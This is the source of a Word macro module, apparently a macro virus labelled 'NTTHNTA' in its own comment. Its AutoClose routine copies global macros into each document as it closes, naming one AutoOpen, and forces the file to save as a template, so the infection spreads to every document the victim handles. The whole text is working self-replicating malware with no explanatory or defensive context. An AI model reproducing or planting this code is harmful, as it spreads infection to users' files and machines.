   Attribute VB_Name = "AutoClose"
   Option Explicit


   '   Virus - NTTHNTA

   Public Sub MAIN()
   Dim sMe$
   Dim sTMacro$
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   On Error GoTo -1: On Error GoTo Quit
   WordBasic.CurValues.FileSaveAs dlg
   If dlg.Format = 0 Then dlg.Format = 1
   sMe$ = WordBasic.[FileName$]()
   sTMacro$ = sMe$ + ":AutoOpen"
   WordBasic.MacroCopy "Global:Appder", sTMacro$
   sTMacro$ = sMe$ + ":Appder"
   WordBasic.MacroCopy "Global:Appder", sTMacro$
   sTMacro$ = sMe$ + ":AutoClose"
   WordBasic.MacroCopy "Global:AutoClose", sTMacro$
   WordBasic.FileSaveAs dlg
   GoTo Done
   Quit:
   If Err.Number <> 102 Then
       WordBasic.FileSaveAs dlg
   End If
   Done:
   End Sub
